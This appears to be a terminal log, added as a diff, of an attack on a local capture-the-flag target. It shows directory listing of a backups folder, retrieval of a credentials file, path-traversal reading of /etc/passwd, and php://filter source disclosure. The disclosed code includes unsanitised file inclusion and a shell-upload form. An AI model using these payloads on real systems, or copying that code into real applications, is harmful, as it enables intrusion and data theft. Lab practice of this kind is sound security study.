@@ -1,0 +1,63 @@
+chifay@kali:~/SHADOW ADMIN$ curl -sS http://172.17.0.2/backups/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /backups</title>
+ </head>
+ <body>
+<h1>Index of /backups</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="config.bak">config.bak</a></td><td align="right">2026-03-06 20:18  </td><td align="right"> 54 </td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.18 (Ubuntu) Server at 172.17.0.2 Port 80</address>
+</body></html>
+
+chifay@kali:~/SHADOW ADMIN$ curl -sS http://172.17.0.2/backups/config.bak
+
+DB_USER=admin
+DB_PASS=[REDACTADO]
+APP_KEY=[REDACTADO]
+
+chifay@kali:~/SHADOW ADMIN$ curl -sS "http://172.17.0.2/index.php?page=../../../../../../etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+snmp:x:105:107::/var/lib/snmp:/usr/sbin/nologin
+admin:x:1000:1000::/home/admin:/bin/bash
+
+chifay@kali:~/SHADOW ADMIN$ curl -sS "http://172.17.0.2/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
+
+<?php if(isset($_GET["page"])) include($_GET["page"]); ?>
+
+chifay@kali:~/SHADOW ADMIN$ curl -sS "http://172.17.0.2/index.php?page=php://filter/convert.base64-encode/resource=profile.php" | base64 -d
+
+<?php session_start(); if(isset($_POST["login"])) { if($_POST["user"]=="admin" && $_POST["pass"]=="[REDACTADO]") { $_SESSION["admin"]=true; } } if(isset($_SESSION["admin"])) { if(isset($_POST["upload"])) move_uploaded_file($_FILES["shell"]["tmp_name"], "/var/www/html/shell.php"); echo "<form method=POST enctype=multipart/form-data><input type=file name=shell><input type=submit name=upload></form>"; } else { echo "<form method=POST>User: <input name=user><br>Pass: <input type=password name=pass><br><input type=submit name=login></form>"; } ?>
+chifay@kali:~/SHADOW ADMIN$ exit
+
+exit
